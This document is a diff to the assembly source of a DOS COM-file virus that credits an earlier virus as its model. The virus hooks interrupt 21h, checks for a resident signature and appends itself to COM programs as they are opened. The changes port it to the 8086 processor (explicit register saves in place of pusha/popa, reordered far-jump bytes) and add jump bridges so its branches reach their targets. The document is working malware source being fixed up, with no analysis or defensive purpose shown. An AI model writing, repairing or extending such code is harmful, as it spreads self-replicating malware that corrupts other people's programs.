@@ -6,6 +6,8 @@
 ; And hers to creeper: https://github.com/guitmz/virii/blob/master/c/CREEPER.ASM
 
 org 0h
+bits 16
+cpu 8086
 
 beninging:
 
@@ -57,8 +59,8 @@ relocate:             ; Updated
      mov word [jmp_off+bp], ax  ; Update the jump offset to point to the new segment
 
      db 0EAh
-     jmp_seg db 00h, 00h   ; Jump far, absolute, address given in operand 
      jmp_off db 00h, 00h   ; Jump far, absolute, address given in operand
+     jmp_seg db 00h, 00h   ; Jump far, absolute, address given in operand 
 
      
      
@@ -95,7 +97,15 @@ dont_install:
 
 
 new_int21:
-     pusha
+     push ax
+     push bx
+     push cx
+     push dx
+     push si
+     push di
+     push bp  ; Save BP because you use it for your Delta Offset
+     push ds
+     push es
      push bp
      push ax
      call near .past_bp
@@ -113,7 +123,15 @@ new_int21:
      je short infect            ; On entry: DS:DX = ASCIIZ filename pointer
 .restore_state:
      pop bp
-     popa
+     pop es
+     pop ds
+     pop bp
+     pop di
+     pop si
+     pop dx
+     pop cx
+     pop bx
+     pop ax
 .call_int21:
      jmp short goto_int21
 
@@ -124,7 +142,15 @@ goto_int21: db 0EAh, 00h, 00h, 00h, 00h   ; Jump far, absolute, address given in
 send_msg:
      mov ax, 8b7bh    ; In Mem Signature
      pop bp
-     popa
+     pop es
+     pop ds
+     pop bp
+     pop di
+     pop si
+     pop dx
+     pop cx
+     pop bx
+     pop ax
      iret
 
 infect:               ; DS:DX = ASCIIZ Filename pointer
@@ -147,9 +173,12 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx           ; Restore BX too
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ EXE file?
-     je short .abort_infection ; Yes, abort the infection attempt
+     je short infect.abort_infection_bridge ; Yes, abort the infection attempt
      push bx          ; Save BX
-
+     jmp short .skip_int21_bridge
+.get_to_int21_bridge2:
+     jmp short new_int21.call_int21
+.skip_int21_bridge:
                       ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
      mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
      pop bx
@@ -159,7 +188,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx
      cmp ax, 65436-virus_size   ; Is the file too big??
-     jae short .abort_infection
+     jae short infect.abort_infection_bridge
      mov [data_section.host_size+bp], ax
      push bx          ; Nope, perfetto sizo. BX = File handle
 
@@ -172,6 +201,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      pop bp
      int 21h          ; Calling int 21h
      pop bx
+
+
 
      push bp
      add bp, data_section.shine_buf
@@ -194,7 +225,14 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx  
      pop bp
+     jmp short .skip_bridge
+.get_to_int21_bridge:
+     jmp short .get_to_int21_bridge2
 
+.abort_infection_bridge:
+     jmp short .abort_infection
+
+.skip_bridge:
      push bx
      push bp
      mov ax, 4000h     ; Function 40h (Write file or device)
@@ -250,8 +288,16 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
 
 .abort_infection:
      pop bp
-     popa
-     jmp short new_int21.call_int21
+     pop es
+     pop ds
+     pop bp
+     pop di
+     pop si
+     pop dx
+     pop cx
+     pop bx
+     pop ax
+     jmp short .get_to_int21_bridge
 
 
 
